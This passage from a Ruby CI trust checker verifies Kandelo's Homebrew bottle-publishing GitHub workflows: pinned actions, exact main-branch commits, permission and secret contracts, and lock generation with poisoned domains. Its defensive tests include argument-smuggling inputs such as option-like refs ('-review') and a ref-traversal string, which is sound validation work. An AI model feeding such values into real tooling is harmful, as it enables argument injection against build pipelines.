            "write publication requires an exact lowercase 40-character Kandelo commit SHA"
          ),
          "publisher write path accepts #{label}")
  end

  {
    "fully qualified ref" => "refs/heads/review/homebrew",
    "invalid ref traversal" => "review..homebrew",
    "option-like ref" => "-review",
    "empty ref" => "",
  }.each do |label, ref|
    rejected = caller_validation_result(source, { "KANDELO_REF" => ref })
    check(rejected["status"] == 2 &&
          rejected["stderr"].include?("dry-run Kandelo ref must be a branch name or exact"),
          "publisher dry-run accepts #{label}")
  end

  alternate_tap_sha = "f" * 40
  alternate = caller_validation_result(
    source, write_caller.merge("TAP_REF" => alternate_tap_sha)
  )
  check(alternate["status"] == 0 && alternate["outputs"].include?(
          "tap-ref=#{alternate_tap_sha}\n"
        ), "publisher binds write source to workflow execution head instead of the request")

  {
    "missing commit" => "",
    "mutable main" => "main",
    "fully qualified main" => "refs/heads/main",
    "uppercase commit" => "E" * 40,
    "short commit" => "e" * 39,
    "long commit" => "e" * 41,
    "option-like ref" => "-#{'e' * 40}",
  }.each do |label, tap_ref|
    rejected = caller_validation_result(
      source, write_caller.merge("TAP_REF" => tap_ref)
    )
    check(rejected["status"] == 2 &&
          rejected["stderr"].include?(
            "write publication requires an exact reviewed lowercase 40-character tap commit SHA"
          ), "publisher write path accepts #{label} as its tap source")
  end

end

def check_kandelo_main_admission_behavior(workflow)
  plan_steps = job_steps(workflow_jobs(workflow).fetch("plan"), "publisher plan")
  source = named_step(plan_steps, "Admit exact Kandelo main source").fetch("run")

  accepted = kandelo_main_admission_result(source)
  check(accepted["status"] == 0,
        "publisher rejects the exact current Kandelo main commit")

  {
    "ancestor" => "1" * 40,
    "descendant" => "2" * 40,
    "equal-tree commit" => "3" * 40,
    "tag target" => "4" * 40,
    "pull-request head" => "5" * 40,
    "activation rehearsal" => "461d3f1450025bb2cd5392900abfd248eee5e028",
  }.each do |label, sha|
    rejected = kandelo_main_admission_result(source, "KANDELO_SHA" => sha)
    check(rejected["status"] == 1 && rejected["stdout"].include?(
            "write publication requires the current Kandelo refs/heads/main commit"
          ), "publisher admits #{label} instead of exact current main")
  end

  {
    "mutable response" => "main",
    "uppercase response" => SELF_TEST_KANDELO_MAIN_SHA.upcase,
    "short response" => SELF_TEST_KANDELO_MAIN_SHA[0...-1],
  }.each do |label, sha|
    rejected = kandelo_main_admission_result(source, "TEST_MAIN_SHA" => sha)
    check(rejected["status"] == 1 && rejected["stdout"].include?(
            "refs/heads/main returned a noncanonical commit identity"
          ), "publisher accepts #{label} as the current main identity")
  end

  unavailable = kandelo_main_admission_result(
    source, "TEST_GH_FAILURE" => "true"
  )
  check(unavailable["status"] == 1 && unavailable["stdout"].include?(
          "could not read the current Kandelo refs/heads/main commit"
        ), "publisher admits a source when the main ref is unavailable")
end

def check_tap_source_binding_behavior(workflow)
  plan_steps = job_steps(workflow_jobs(workflow).fetch("plan"), "publisher plan")
  source = named_step(
    plan_steps, "Bind write tap source to protected main history"
  ).fetch("run")

  %w[identical ahead].each do |compare_status|
    accepted = tap_source_binding_result(
      source, "TEST_COMPARE_STATUS" => compare_status
    )
    check(accepted["status"] == 0,
          "publisher rejects protected-main source status #{compare_status}")
  end

  %w[behind diverged unexpected].each do |compare_status|
    rejected = tap_source_binding_result(
      source, "TEST_COMPARE_STATUS" => compare_status
    )
    check(rejected["status"] == 1 && rejected["stdout"].include?(
            "requested tap commit must remain on protected main history"
          ), "publisher accepts protected-main source status #{compare_status}")
  end

  mismatch = tap_source_binding_result(source, "TAP_SHA" => "f" * 40)
  check(mismatch["status"] == 2 && mismatch["stdout"].include?(
          "tap checkout differs from the exact requested source commit"
        ), "publisher accepts a tap checkout different from the request")

  unavailable = tap_source_binding_result(source, "TEST_GH_FAILURE" => "true")
  check(unavailable["status"] == 1 && unavailable["stdout"].include?(
          "could not prove that the requested tap commit belongs to protected main"
        ), "publisher accepts a tap source when protected-main ancestry is unavailable")
end

def check_architecture_aware_sysroot_step(step, label)
  check(step.keys.sort == %w[env name run shell] && step["shell"] == "bash" &&
        step["env"] == { "KANDELO_HOMEBREW_ARCH" => "${{ matrix.arch }}" },
        "#{label} sysroot mapping changed")
  run = step.fetch("run")
  check(run.lines.count { |line| line.strip ==
        "bash scripts/dev-shell.sh bash scripts/build-musl.sh" } == 1,
        "#{label} does not build the invariant wasm32 base sysroot exactly once")
  check(run.lines.count { |line| line.strip ==
        "bash scripts/dev-shell.sh bash scripts/build-musl.sh --arch wasm64posix" } == 1,
        "#{label} does not build the wasm64 target sysroot exactly once")
  [
    'case "$KANDELO_HOMEBREW_ARCH" in', "wasm32) ;;", "wasm64)",
    "unsupported Kandelo Homebrew architecture", "exit 2",
  ].each do |fragment|
    check(run.include?(fragment), "#{label} architecture selection lacks #{fragment}")
  end
end

def check_sidecar_sysroot_binding(source, fingerprint_source)
  [
    'BUILD_ROOT="${KANDELO_HOMEBREW_BUILD_ROOT:-$KANDELO_ROOT}"',
    'SYSROOT_FINGERPRINT="$(bash "$KANDELO_ROOT/scripts/homebrew-sysroot-fingerprint.sh"',
    '--kandelo-root "$BUILD_ROOT" --arch "$KANDELO_HOMEBREW_ARCH")"',
    'BUILD_COMMIT="$(git -C "$BUILD_ROOT" rev-parse HEAD)"',
    'if [ "$BUILD_COMMIT" != "$KANDELO_COMMIT" ]; then',
  ].each do |fragment|
    check(source.include?(fragment), "sidecar target-sysroot binding lacks #{fragment}")
  end
  check(source.scan("SYSROOT_FINGERPRINT=").length == 1,
        "sidecar generator has more than one sysroot fingerprint source")
  [
    'wasm32) SYSROOT_LIBC="$KANDELO_ROOT/sysroot/lib/libc.a" ;;',
    'wasm64) SYSROOT_LIBC="$KANDELO_ROOT/sysroot64/lib/libc.a" ;;',
    '[ ! -f "$SYSROOT_LIBC" ] || [ -L "$SYSROOT_LIBC" ]',
    'selected $ARCH sysroot libc must be a regular non-symlink file',
    'sha256sum "$SYSROOT_LIBC"', 'shasum -a 256 "$SYSROOT_LIBC"',
  ].each do |fragment|
    check(fingerprint_source.include?(fragment),
          "sidecar sysroot fingerprint helper lacks #{fragment}")
  end
end

def check_sidecar_checkout_binding(source)
  start = source.index("dependency_validation_args=(\n")
  finish = source.index("\n)\nif [ -n ", start || 0)
  check(start && finish && start < finish,
        "sidecar dependency validation argument boundary changed")
  dependency_args = source[start...finish]
  [
    '--tap-commit "$TAP_COMMIT"',
    '--tap-checkout-commit "$TAP_CHECKOUT_COMMIT"',
    '--tap-root "$FORMULA_SOURCE_ROOT"',
  ].each do |fragment|
    check(dependency_args.include?(fragment),
          "sidecar dependency validation lacks #{fragment}")
  end
  check(
    source.scan('--tap-checkout-commit "$TAP_CHECKOUT_COMMIT"').length == 2,
    "sidecar dependency and runtime validation do not share checkout identity"
  )
end

def check_forbidden_root_args(run, label, expected)
  actual = run.lines.filter_map do |line|
    stripped = line.strip.delete_suffix(" \\")
    stripped if stripped.start_with?("--forbidden-root ")
  end
  check(actual == expected, "#{label} forbidden-root trust mapping changed")
end

def check_exact_main_recheck(run, mutation, label, helper:)
  helper_index = run.index("bash #{helper} \\")
  repository_index = run.index("--repository Automattic/kandelo", helper_index || 0)
  source_index = run.index(
    '--source-sha "$KANDELO_HOMEBREW_KANDELO_COMMIT"',
    repository_index || 0
  )
  mutation_index = run.index(mutation, source_index || 0)
  check(helper_index && repository_index && source_index && mutation_index &&
        helper_index < repository_index && repository_index < source_index &&
        source_index < mutation_index &&
        run.scan("require-exact-kandelo-main.sh").length == 1,
        "#{label} does not recheck exact current main immediately before mutation")
end

def exact_permissions?(actual, expected)
  actual.is_a?(Hash) && actual.transform_keys(&:to_s) == expected
end

def check_common(workflow, label, allowed_secret_nodes: [])
  mutable_actions = values_for_key(workflow, "uses").select do |value|
    value.is_a?(String) && !value.start_with?("./") &&
      !value.match?(%r{\A[^@\s]+@[0-9a-f]{40}\z})
  end
  check(mutable_actions.empty?,
        "#{label} executes mutable action refs: #{mutable_actions.join(', ')}")

  cache_uses = values_for_key(workflow, "uses").select do |value|
    value.is_a?(String) && value.downcase.match?(%r{\Aactions/cache(?:/restore)?@})
  end
  check(cache_uses.empty?, "#{label} consumes Actions cache state: #{cache_uses.join(', ')}")

  unsafe_runs = values_for_key(workflow, "run").select do |value|
    value.is_a?(String) && value.include?("${{")
  end
  check(unsafe_runs.empty?, "#{label} interpolates a GitHub expression into shell syntax")
  check(values_for_key(workflow, "secrets") == allowed_secret_nodes,
        "#{label} secret contract changed")
end

def check_tap_caller(path, expected_name:, event_type:, job_name:, reusable:, inputs:, secrets: {})
  workflow = load_workflow(path)
  top_keys = workflow.keys.map { |key| key == true ? "on" : key.to_s }.sort
  check(top_keys == %w[jobs name on], "#{File.basename(path)} has unexpected top-level configuration")
  check(workflow["name"] == expected_name, "#{File.basename(path)} name changed")
  check(workflow_events(workflow) == {
    "repository_dispatch" => { "types" => [event_type] },
  }, "#{File.basename(path)} must expose only its reviewed repository_dispatch event")
  jobs = workflow_jobs(workflow)
  check(jobs.keys == [job_name], "#{File.basename(path)} has an unexpected job set")
  job = jobs.fetch(job_name)
  expected_job_keys = %w[permissions uses with]
  expected_job_keys << "secrets" unless secrets.empty?
  check(job.keys.sort == expected_job_keys.sort,
        "#{File.basename(path)} caller job changed")
  check(exact_permissions?(job["permissions"], {
    "actions" => "read", "contents" => "write", "packages" => "write",
  }), "#{File.basename(path)} permission ceiling changed")
  check(job["uses"] == reusable, "#{File.basename(path)} reusable workflow target changed")
  check(job["with"] == inputs, "#{File.basename(path)} caller inputs changed")
  check(job.fetch("secrets", {}) == secrets, "#{File.basename(path)} caller secrets changed")
  check(values_for_key(workflow, "run").empty? && values_for_key(workflow, "steps").empty?,
        "#{File.basename(path)} may not execute caller-local steps")
  expected_secret_nodes = secrets.empty? ? [] : [secrets]
  check(values_for_key(workflow, "secrets") == expected_secret_nodes,
        "#{File.basename(path)} may pass only its reviewed named secrets")
end

def check_tap_callers
  common_publish_inputs = {
    "kandelo-repository" => "Automattic/kandelo",
    "kandelo-ref" => "${{ github.event.client_payload.kandelo_sha }}",
    "tap-repository" => "kandelo-dev/homebrew-tap-core",
    "tap-name" => "kandelo-dev/tap-core",
    "tap-ref" => "${{ github.event.client_payload.tap_sha }}",
    "formulae" => "${{ github.event.client_payload.formulae }}",
    "arches" => "${{ github.event.client_payload.arches || 'wasm32' }}",
    "release-tag" => "${{ github.event.client_payload.release_tag || '' }}",
    "expected-cache-keys" => "${{ github.event.client_payload.expected_cache_keys || '' }}",
    "package-generation-wasm32" =>
      "${{ github.event.client_payload.package_generation_wasm32 }}",
    "package-generation-wasm64" =>
      "${{ github.event.client_payload.package_generation_wasm64 }}",
    "force" => "${{ github.event.client_payload.force || false }}",
    "dry-run" => false,
  }
  write_publish_inputs = common_publish_inputs.merge({
    "defer-tap-finalization" =>
      "${{ github.event.client_payload.defer_tap_finalization || false }}",
    # Required VFS acceptance needs bottles published by this invocation.
    # Keep the caller-selected gate out of the non-writing dry-run contract.
    "require-vfs-acceptance" =>
      "${{ github.event.client_payload.require_vfs_acceptance || false }}",
  })
  check_tap_caller(
    File.join(TAP_CALLER_ROOT, "publish-bottles.yml"),
    expected_name: "Publish Kandelo bottles",
    event_type: "publish-kandelo-bottles",
    job_name: "publish",
    reusable: "Automattic/kandelo/.github/workflows/reusable-homebrew-bottle-publish.yml@main",
    inputs: write_publish_inputs,
  )

  check_tap_caller(
    File.join(TAP_CALLER_ROOT, "dry-run-bottles.yml"),
    expected_name: "Dry run Kandelo bottles",
    event_type: "dry-run-kandelo-bottles",
    job_name: "dry-run",
    reusable: "Automattic/kandelo/.github/workflows/reusable-homebrew-bottle-publish.yml@main",
    inputs: common_publish_inputs.merge({
      "kandelo-repository" => "${{ github.event.client_payload.kandelo_repository || 'Automattic/kandelo' }}",
      "kandelo-ref" => "${{ github.event.client_payload.kandelo_ref || 'main' }}",
      "tap-repository" => "${{ github.event.client_payload.tap_repository || 'kandelo-dev/homebrew-tap-core' }}",
      "tap-name" => "${{ github.event.client_payload.tap_name || 'kandelo-dev/tap-core' }}",
      "tap-ref" => "${{ github.event.client_payload.tap_ref || 'main' }}",
      "package-generation-wasm32" =>
        "${{ github.event.client_payload.package_generation_wasm32 || '' }}",
      "package-generation-wasm64" =>
        "${{ github.event.client_payload.package_generation_wasm64 || '' }}",
      "dry-run" => true,
    }),
  )

  check_tap_caller(
    File.join(TAP_CALLER_ROOT, "maintain-bottles.yml"),
    expected_name: "Maintain Kandelo bottles",
    event_type: "maintain-kandelo-bottles",
    job_name: "maintain",
    reusable: "Automattic/kandelo/.github/workflows/reusable-homebrew-bottle-maintenance.yml@main",
    inputs: {
      "mode" => "${{ github.event.client_payload.mode || 'rebuild' }}",
      "kandelo-ref" => "${{ github.event.client_payload.kandelo_sha }}",
      "tap-ref" => "${{ github.event.client_payload.tap_sha }}",
      "formulae" => "${{ github.event.client_payload.formulae }}",
      "arches" => "${{ github.event.client_payload.arches || 'wasm32' }}",
      "release-tag" => "${{ github.event.client_payload.release_tag || '' }}",
      "expected-cache-keys" => "${{ github.event.client_payload.expected_cache_keys || '' }}",
      "package-generation-wasm32" =>
        "${{ github.event.client_payload.package_generation_wasm32 }}",
      "package-generation-wasm64" =>
        "${{ github.event.client_payload.package_generation_wasm64 }}",
      "force" => "${{ github.event.client_payload.force || false }}",
      "rollback-reason" => "${{ github.event.client_payload.rollback_reason || '' }}",
      "rollback-ref" => "${{ github.event.client_payload.rollback_ref || '' }}",
      "deleted-package-url" => "${{ github.event.client_payload.deleted_package_url || '' }}",
      "deletion-reason" => "${{ github.event.client_payload.deletion_reason || '' }}",
    },
  )
end

def check_native_compatibility_workflow(workflow)
  ca_proof_path = File.join(
    REPO_ROOT, "scripts/test-homebrew-native-ca-lifecycle.sh"
  )
  check(File.file?(ca_proof_path) && !File.symlink?(ca_proof_path) &&
        (File.stat(ca_proof_path).mode & 0o111).positive? &&
        Digest::SHA256.file(ca_proof_path).hexdigest ==
          NATIVE_CA_PROOF_SHA256,
        "native CA lifecycle proof bytes or executable mode changed")
  top_keys = workflow.keys.map { |key| key == true ? "on" : key.to_s }.sort
  check(top_keys == %w[concurrency jobs name on permissions],
        "native compatibility workflow has unexpected top-level configuration")
  check(workflow["name"] == "Homebrew native publisher compatibility",
        "native compatibility workflow name changed")
  check(workflow_events(workflow) == {
    "pull_request" => {
      "paths" => [
        ".github/workflows/homebrew-native-publisher-compatibility.yml",
        ".github/workflows/reusable-homebrew-bottle-publish.yml",
        ".github/workflows/reusable-homebrew-closed-selection-publish.yml",
        ".github/workflows/reusable-homebrew-prefix-first-child-publish.yml",
        "flake.lock",
        "flake.nix",
        "homebrew/**",
        "scripts/build-fork-instrument-tool.sh",
        "scripts/build-musl.sh",
        "scripts/check-homebrew-publish-workflow-trust.rb",
        "scripts/dev-shell.sh",
        "scripts/homebrew-*",
        "scripts/materialize-exact-package-generations.sh",
        "scripts/materialize-resolver-binaries.sh",
        "scripts/prepare-homebrew-package-materializer.sh",
        "scripts/require-exact-kandelo-main.sh",
        "scripts/resolve-binary.sh",
        "scripts/seal-homebrew-formula-checker.sh",
        "scripts/test-homebrew-*",
        "scripts/validate-software-gallery.mjs",
      ],
    },
  }, "native compatibility workflow trigger surface changed")
  check(exact_permissions?(workflow["permissions"], { "contents" => "read" }),
        "native compatibility workflow permission ceiling changed")
  check(workflow["concurrency"] == {
    "group" =>
      "homebrew-native-publisher-${{ github.event.pull_request.number }}",
    "cancel-in-progress" => true,
  }, "native compatibility workflow concurrency changed")
  check_common(workflow, "native compatibility workflow")

  jobs = workflow_jobs(workflow)
  check(jobs.keys == %w[exact-linux-contract],
        "native compatibility workflow job set changed")
  linux = jobs.fetch("exact-linux-contract")
  check(linux.keys.sort == %w[permissions runs-on steps timeout-minutes] &&
        linux["runs-on"] == "ubuntu-latest" &&
        linux["timeout-minutes"] == 60 &&
        exact_permissions?(linux["permissions"], { "contents" => "read" }),
        "native compatibility Linux job authority changed")
  steps = job_steps(linux, "native compatibility Linux proof")
  check(steps.map { |step| step["name"] } == [
    "Checkout exact PR head",
    "Checkout exact reviewed Homebrew source",
    "Install Nix",
    "Generate exact Linux compatibility lock",
    "Require reviewed lock equality",
    "Prove CA postinstall, OpenSSL link, and verified TLS",
    "Validate native CA lifecycle evidence",
    "Retain native CA lifecycle evidence",
    "Retain exact generated Linux lock",
  ], "native compatibility Linux proof order changed")
  checkout = named_step(steps, "Checkout exact PR head")
  check(checkout["uses"] == NATIVE_COMPATIBILITY_CHECKOUT_ACTION &&
        checkout["with"] == {
          "persist-credentials" => false,
          "ref" => "${{ github.event.pull_request.head.sha }}",
          "submodules" => false,
        }, "native compatibility source checkout changed")
  brew_checkout = named_step(steps, "Checkout exact reviewed Homebrew source")
  check(brew_checkout["uses"] == NATIVE_COMPATIBILITY_CHECKOUT_ACTION &&
        brew_checkout["with"] == {
          "persist-credentials" => false,
          "repository" => "Homebrew/brew",
          "ref" => BREW_COMMIT,
          "path" => "brew-source",
        }, "native compatibility Homebrew checkout changed")
  nix = named_step(steps, "Install Nix")
  check(nix["uses"] == NIX_ACTION &&
        nix["with"] == { "github-token" => "" },
        "native compatibility Nix bootstrap changed")

  generation = named_step(steps, "Generate exact Linux compatibility lock")
  check(generation.keys.sort == %w[env name run shell] &&
        generation["shell"] == "bash" &&
        Digest::SHA256.hexdigest(generation.fetch("run")) ==
          NATIVE_LOCK_GENERATION_RUN_SHA256 &&
        generation["env"] == {
          "GENERATED_LOCK" =>
            "${{ runner.temp }}/homebrew-native-proof/compatibility-lock.json",
        }, "native compatibility lock generation mapping changed")
  [
    "HOMEBREW_NO_INSTALL_FROM_API=1",
    "HOMEBREW_API_DOMAIN=https://api.poison.invalid",
    "HOMEBREW_BOTTLE_DOMAIN=https://bottles.poison.invalid",
    "HOMEBREW_CURL_PATH=/bin/false",
    "HOMEBREW_GIT_PATH=/bin/false",
    "HOMEBREW_CORE_GIT_REMOTE=https://git.poison.invalid/core",
    "RUBYOPT=-rdoes-not-exist",
    "BUNDLE_GEMFILE=/does/not/exist",
    "scripts/update-homebrew-native-compatibility-lock.sh",
    '"$GITHUB_WORKSPACE/brew-source/bin/brew"',
    '"$GENERATED_LOCK"',
  ].each do |fragment|
    check(generation.fetch("run").include?(fragment),
          "native compatibility lock generation lacks #{fragment}")
  end
  retained_lock = named_step(steps, "Retain exact generated Linux lock")
  check(retained_lock["if"] == "${{ always() }}" &&
        retained_lock["uses"] == UPLOAD_ACTION &&
        retained_lock["with"] == {
          "name" => "homebrew-native-linux-lock",
          "path" =>
            "${{ runner.temp }}/homebrew-native-proof/compatibility-lock.json",
          "if-no-files-found" => "ignore",
          "retention-days" => 14,
        }, "native compatibility generated-lock evidence changed")
  equality = named_step(steps, "Require reviewed lock equality")
  check(equality.keys.sort == %w[name run shell] &&
        equality["shell"] == "bash" &&
        Digest::SHA256.hexdigest(equality.fetch("run")) ==
          NATIVE_LOCK_EQUALITY_RUN_SHA256 &&
        equality.fetch("run").include?(
          "homebrew/homebrew-native-compatibility-lock.json"
        ) && equality.fetch("run").include?(
          '"$RUNNER_TEMP/homebrew-native-proof/compatibility-lock.json"'
        ), "native compatibility workflow does not require exact lock equality")
  ca_proof = named_step(
    steps, "Prove CA postinstall, OpenSSL link, and verified TLS"
  )
  check(ca_proof.keys.sort == %w[id name run shell] &&
        ca_proof["id"] == "ca-proof" &&
        ca_proof["shell"] == "bash",
        "native compatibility CA proof invocation changed")
  check(Digest::SHA256.hexdigest(ca_proof.fetch("run")) ==
        NATIVE_CA_PROOF_RUN_SHA256,
        "native compatibility CA proof command changed")
  [
    "scripts/test-homebrew-native-ca-lifecycle.sh",
    '"$GITHUB_WORKSPACE/brew-source/bin/brew"',
    '"$RUNNER_TEMP/homebrew-native-proof/ca-lifecycle.json"',
  ].each do |fragment|
    check(ca_proof.fetch("run").include?(fragment),
          "native compatibility CA proof lacks #{fragment}")
  end
  ca_validation = named_step(steps, "Validate native CA lifecycle evidence")
  check(ca_validation.keys.sort == %w[name run shell] &&
        ca_validation["shell"] == "bash" &&
        Digest::SHA256.hexdigest(ca_validation.fetch("run")) ==
          NATIVE_CA_VALIDATION_RUN_SHA256,
        "native compatibility CA evidence validator changed")
  [
    '[ -f "$evidence" ] && [ ! -L "$evidence" ]',
    '"kandelo-homebrew-native-ca-lifecycle"',
    '"kandelo-homebrew-native-api-attestation"',
    '"kandelo-homebrew-native-cellar-attestation"',
    '.admission.roots == ["ruby"]',
    '.cellar.required_formulae == ["ruby"]',
    'any(.cellar.kegs[]; .name == "ca-certificates")',
    'any(.cellar.kegs[]; .name == "openssl@3")',
    'any(.cellar.kegs[]; .name == "ruby")',
    '.ca_certificates.openssl_cert_link == true',
    'test("^[0-9a-f]{64}$")',
    'startswith("OpenSSL 3.")',
    '.openssl.verified_tls_host == "github.com"',
  ].each do |fragment|
    check(ca_validation.fetch("run").include?(fragment),
          "native compatibility CA evidence validation lacks #{fragment}")
  end
  retained_ca = named_step(steps, "Retain native CA lifecycle evidence")
  check(retained_ca["if"] ==
          "${{ always() && steps.ca-proof.outcome == 'success' }}" &&
        retained_ca["uses"] == UPLOAD_ACTION &&
        retained_ca["with"] == {
          "name" => "homebrew-native-ca-lifecycle",
          "path" =>
            "${{ runner.temp }}/homebrew-native-proof/ca-lifecycle.json",
          "if-no-files-found" => "error",
          "retention-days" => 14,
        }, "native compatibility CA evidence changed")
end

def check_closed_selection_workflow(workflow)
  check(
    workflow["name"] == "Reusable Homebrew closed-selection publish",
    "closed-selection workflow name changed"
  )
  jobs = workflow_jobs(workflow)
  check(jobs.keys.sort == %w[prepare publish],
        "closed-selection workflow job set changed")
  prepare = jobs.fetch("prepare")
  publish = jobs.fetch("publish")
  check(
    prepare.fetch("outputs").fetch("campaign-tag") ==
      "${{ steps.admit.outputs.campaign-tag }}",
    "closed-selection prepare job does not export admitted campaign tag"
  )
  steps = job_steps(publish, "closed-selection publish")
  download = named_step(
    steps, "Download only the same-run prepared selection"
  )
  fetch = named_step(
    steps, "Fetch the exact campaign for independent verification"
  )
  materialize = named_step(
    steps, "Materialize campaign source for independent reconstruction"
  )
  verify = named_step(
    steps, "Reconstruct and verify the downloaded selection"
  )
  check(steps.index(download) < steps.index(fetch) &&
        steps.index(fetch) < steps.index(materialize) &&
        steps.index(materialize) < steps.index(verify),
        "closed-selection campaign verification order changed")
  source_checkout = named_step(
    steps, "Checkout exact campaign source for reconstruction"
  )
  check(source_checkout.fetch("with") == {
    "repository" => "kandelo-dev/homebrew-tap-core",
    "ref" => "${{ needs.prepare.outputs.source-tap-commit }}",
    "path" => "verification-source-tap",
    "fetch-depth" => 0,
    "persist-credentials" => false,
  }, "closed-selection reconstruction source checkout changed")
  check(fetch["shell"] == "bash" && fetch["env"] == {
    "CAMPAIGN_TAG" => "${{ needs.prepare.outputs.campaign-tag }}",
  }, "closed-selection campaign readback authority changed")
  fetch_run = fetch.fetch("run")
  [
    "env -u GH_TOKEN -u GITHUB_TOKEN",
    "-u HOMEBREW_GITHUB_API_TOKEN",
    "-u HOMEBREW_GITHUB_PACKAGES_TOKEN",
    "-u HOMEBREW_DOCKER_REGISTRY_TOKEN",
    "homebrew-prefix-campaign-executor.py",
    "fetch-campaign-release",
    "--repository kandelo-dev/homebrew-tap-core",
    '--tag "$CAMPAIGN_TAG"',
    'closed-selection-verification/campaign.json',
    'closed-selection-verification/receipt.json',
  ].each do |fragment|
    check(fetch_run.include?(fragment),
          "closed-selection campaign readback lacks #{fragment}")
  end
  materialize_run = materialize.fetch("run")
  [
    "env -u GH_TOKEN -u GITHUB_TOKEN",
    "-u HOMEBREW_GITHUB_API_TOKEN",
    "-u HOMEBREW_GITHUB_PACKAGES_TOKEN",
    "-u HOMEBREW_DOCKER_REGISTRY_TOKEN",
    "homebrew-prefix-campaign-executor.py",
    "materialize-campaign-source",
    "--source-tap-root verification-source-tap",
    "closed-selection-verification/target-source",
  ].each do |fragment|
    check(materialize_run.include?(fragment),
          "closed-selection source reconstruction lacks #{fragment}")
  end
  verify_run = verify.fetch("run")
  check(verify_run.include?("reconstruct-verify") &&
        verify_run.include?("--campaign") &&
        verify_run.include?(
          "closed-selection-verification/campaign.json"
        ) && verify_run.include?("--source-tap-root") &&
        verify_run.include?(
          "closed-selection-verification/target-source"
        ),
        "closed-selection verifier lacks independent reconstruction inputs"
  )
end

def check_first_publication(workflow)
  top_keys = workflow.keys.map { |key| key == true ? "on" : key.to_s }.sort
  check(top_keys == %w[concurrency jobs name on],
        "first child publication has unexpected top-level configuration")
  check(workflow["name"] == "Reusable Homebrew first child publication",
        "first child publication name changed")

  events = workflow_events(workflow)
  check(events == {
    "workflow_call" => {
      "inputs" => {
        "kandelo-ref" => { "type" => "string", "required" => true },
        "tap-ref" => { "type" => "string", "required" => true },
        "formula" => { "type" => "string", "required" => true },
        "arch" => { "type" => "string", "required" => true },
        "dry-run-run-id" => { "type" => "string", "required" => true },
        "dry-run-run-attempt" => { "type" => "string", "required" => true },
        "dry-run-child-artifact-digest" => {
          "type" => "string", "required" => true,
        },
        "expected-child-manifest-digest" => {
          "type" => "string", "required" => true,
        },
      },
    },
  }, "first child publication workflow_call contract changed")
  check(!workflow.key?("permissions"),
        "first child publication requests workflow-wide permissions")
  check(workflow["concurrency"] == {
    "group" => "kandelo-homebrew-ghcr-${{ inputs.formula }}",
    "cancel-in-progress" => false,
  }, "first child publication left the shared GHCR writer lock")
  check_common(workflow, "first child publication")

  jobs = workflow_jobs(workflow)
  check(jobs.keys == ["first-publication"],
        "first child publication job set changed")
  job = jobs.fetch("first-publication")
  check(job.keys.sort == %w[permissions runs-on steps timeout-minutes] &&
        job["runs-on"] == "ubuntu-latest" && job["timeout-minutes"] == 30 &&
        exact_permissions?(job["permissions"], {
          "actions" => "read", "contents" => "read", "packages" => "write",
        }), "first child publication authority changed")

  steps = job_steps(job, "first child publication")
  check(contract_digest(steps) == FIRST_PUBLICATION_STEPS_DIGEST,
        "first child publication step contract changed")
  check(values_for_key(workflow, "uses") == [
    CHECKOUT_ACTION, CHECKOUT_ACTION, NIX_ACTION, DOWNLOAD_ACTION, UPLOAD_ACTION,
  ], "first child publication action set or pins changed")

  trust = named_step(steps, "Validate exact first-publication caller")
  check(trust["env"] == {
    "ARCH" => "${{ inputs.arch }}",
    "CALLER_ACTION" => "${{ github.event.action }}",
    "CALLER_EVENT_NAME" => "${{ github.event_name }}",
    "CALLER_REF" => "${{ github.ref }}",
    "CALLER_REPOSITORY" => "${{ github.repository }}",
    "CALLER_SHA" => "${{ github.sha }}",
    "CALLER_WORKFLOW_REF" => "${{ github.workflow_ref }}",
    "DRY_RUN_CHILD_ARTIFACT_DIGEST" =>
      "${{ inputs.dry-run-child-artifact-digest }}",
    "DRY_RUN_RUN_ATTEMPT" => "${{ inputs.dry-run-run-attempt }}",
    "DRY_RUN_RUN_ID" => "${{ inputs.dry-run-run-id }}",
    "EXPECTED_CHILD_MANIFEST_DIGEST" =>
      "${{ inputs.expected-child-manifest-digest }}",
    "FORMULA" => "${{ inputs.formula }}",
    "KANDELO_REF" => "${{ inputs.kandelo-ref }}",
    "TAP_REF" => "${{ inputs.tap-ref }}",
  }, "first child publication caller context changed")
  [
    "kandelo-dev/homebrew-tap-core",
    "refs/heads/main",
    "repository_dispatch",
    "publish-first-homebrew-child",
    "repository-namespace-canary.yml@refs/heads/main",
    '[ "$TAP_REF" = "$CALLER_SHA" ]',
    '[[ "$KANDELO_REF" =~ ^[0-9a-f]{40}$ ]]',
    '[[ "$FORMULA" =~ ^[a-z0-9][a-z0-9._-]{0,63}$ ]]',
    "wasm32|wasm64",
    '[[ "$DRY_RUN_RUN_ID" =~ ^[1-9][0-9]{0,14}$ ]]',
    '[[ "$DRY_RUN_RUN_ATTEMPT" =~ ^[1-9][0-9]{0,2}$ ]]',
    '[[ "$DRY_RUN_CHILD_ARTIFACT_DIGEST" =~ ^sha256:[0-9a-f]{64}$ ]]',
    '[[ "$EXPECTED_CHILD_MANIFEST_DIGEST" =~ ^sha256:[0-9a-f]{64}$ ]]',
  ].each do |fragment|
    check(trust.fetch("run").include?(fragment),
          "first child publication caller validation lacks #{fragment}")
  end

  admission = named_step(
    steps, "Admit protected sources and one completed dry-run child"
  )
  check(admission["env"] == {
    "ARCH" => "${{ inputs.arch }}",
    "CALLER_REPOSITORY" => "${{ github.repository }}",
    "DRY_RUN_CHILD_ARTIFACT_DIGEST" =>
      "${{ inputs.dry-run-child-artifact-digest }}",
    "DRY_RUN_RUN_ATTEMPT" => "${{ inputs.dry-run-run-attempt }}",
    "DRY_RUN_RUN_ID" => "${{ inputs.dry-run-run-id }}",
    "FORMULA" => "${{ inputs.formula }}",
    "GH_TOKEN" => "${{ github.token }}",
    "KANDELO_REF" => "${{ inputs.kandelo-ref }}",
    "TAP_REF" => "${{ inputs.tap-ref }}",
  }, "first child publication admission context changed")
  [
    "/repos/$CALLER_REPOSITORY/git/ref/heads/main",
    "/repos/Automattic/kandelo/git/ref/heads/main",
    "/repos/$CALLER_REPOSITORY/actions/runs/$DRY_RUN_RUN_ID",
    '.path == ".github/workflows/dry-run-bottles.yml"',
    '.event == "repository_dispatch"',
    '.head_branch == "main" and .head_sha == $tap_ref',
    '.status == "completed" and .conclusion == "success"',
    'artifact_name="homebrew-oci-child-${FORMULA}-${ARCH}-attempt-${DRY_RUN_RUN_ATTEMPT}"',
    '.total_count == 1 and (.artifacts | length) == 1',
    '.artifacts[0].digest == $digest',
    '.artifacts[0].expired == false',
  ].each do |fragment|
    check(admission.fetch("run").include?(fragment),
          "first child publication evidence admission lacks #{fragment}")
  end

  kandelo_checkout = named_step(
    steps, "Checkout exact Kandelo first-publication source"
  )
  check(kandelo_checkout["uses"] == CHECKOUT_ACTION &&
